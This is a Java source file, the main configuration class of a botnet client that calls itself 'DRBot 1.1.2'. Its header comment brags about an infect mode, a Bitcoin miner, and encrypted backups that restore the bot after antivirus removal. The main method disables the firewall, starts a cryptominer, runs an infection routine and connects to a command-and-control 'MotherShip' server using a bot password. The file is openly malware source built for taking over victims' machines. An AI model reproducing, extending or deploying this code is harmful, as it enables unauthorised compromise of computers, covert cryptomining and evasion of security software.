package main;

import InitConn.InitConn;
import com.DRBot.Firewall.disableFirewall;
import com.DRBot.OS.checkOS;
import com.DRBot.Commands.chkMiner;
import com.DRBot.Commands.infec;
import java.io.File;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;


public class mainConfig{
    
    /*
        
                          .-----------------MMMM_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''                                 ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    ---'-.
    Updated: 16-9-2016 [Capable of Conncecting to DRbotServer1.1 Enc Version]
    Designer: MerNat
    Date Started: Sunday 15,March,2015
    Date finished: January,2016
    Aim: ~~~~ Pinging ~~~~
    Functionaliy: ~~~~ On the List ~~~~
    Version: DRBot 1.1.2 ~ Infect Mode Ver + Bitcoin Miner + Enc applicable Vers.
    Strength: Strong! have its own encrypted backup if an antivirus find and delete it,
                and ofcourse it will recover/heal itself. ;)
    */
    
    //         ------------- Main Configuration -----------
    
    private static final String Server1 = "localhost"; //your MotherShip Server 
    private static final String myBackupServer = "localhost"; //incase your Server1 is down
    private static final int port = 80; //here the port of your server that is listening
    private static final String botPassword = "Test1"; // your bot needs an authentication. N.B. Dont forget this pass.
    private static final String botName = "DRBot.jar"; //your Virus Name [Optional] [NB: must end with ".jar"]
    
    //         ------------- Main Configuration Ends Here -----------        
    
    private static final boolean Engaged = false; // Engaged - static connection -- do not modify this line.
    private static File myClass;
    private static ExecutorService Service;
    
    public static void main(String args[]) throws InterruptedException{
       myClass = new File(mainConfig.class.getProtectionDomain().getCodeSource().getLocation().getFile().replace("%20"," "));
       checkOS checkOS = new checkOS(botName,myClass);
       disableFirewall disableFirewall = new disableFirewall();
       //------------ Miner Config can be held in the chkMiner Main Class --------------
       
       chkMiner chkMiner = new chkMiner();
        
        //------------ Miner End Here
        Service = Executors.newCachedThreadPool();
        infec infect = new infec(myClass);
        Thread InitCo = new Thread(new InitConn(Server1,myBackupServer,port,botPassword,Engaged));
        Service.execute(infect);
        Service.execute(InitCo);
        Service.shutdown();  
    }
    
    public static File getJarFile(){
        return myClass;
    }
}
